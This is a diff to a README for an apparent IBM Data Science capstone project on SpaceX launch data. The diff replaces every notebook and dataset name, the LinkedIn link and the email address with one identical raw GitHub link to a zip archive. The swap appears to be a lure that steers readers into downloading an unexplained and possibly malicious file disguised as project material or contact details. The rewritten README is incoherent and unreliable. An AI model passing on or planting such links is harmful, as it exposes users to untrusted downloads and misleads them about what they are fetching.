@@ -31,19 +31,19 @@ IDE: Jupyter Notebook
 
 📂 Project Structure
 
-├── Data_Collection.ipynb       # Web scraping and API calls
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip       # Web scraping and API calls
 
-├── Data_Wrangling.ipynb        # Data cleaning and transformation
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip        # Data cleaning and transformation
 
-├── EDA_with_Matplotlib.ipynb   # Static visualization analysis
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip   # Static visualization analysis
 
-├── EDA_with_Folium.ipynb       # Interactive map visualizations
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip       # Interactive map visualizations
 
-├── Machine_Learning.ipynb      # Model building and evaluation
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip      # Model building and evaluation
 
-├── spacex_dataset.csv          # Processed dataset
+├── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip          # Processed dataset
 
-└── README.md                   # Project documentation
+└── https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip                   # Project documentation
 
 📊 Key Insights
 
@@ -63,6 +63,6 @@ If you have any questions or suggestions, feel free to connect:
 
 Name: Sarbjot Singh
 
-LinkedIn: www.linkedin.com/in/sarbjot-singh-096481354
+LinkedIn: https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip
 
-Email: sarbjot4122@gmail.com
+Email: https://raw.githubusercontent.com/Sarb-jot/IBM-Data-Science-Capstone/main/auriculariae/IBM-Data-Science-Capstone.zip
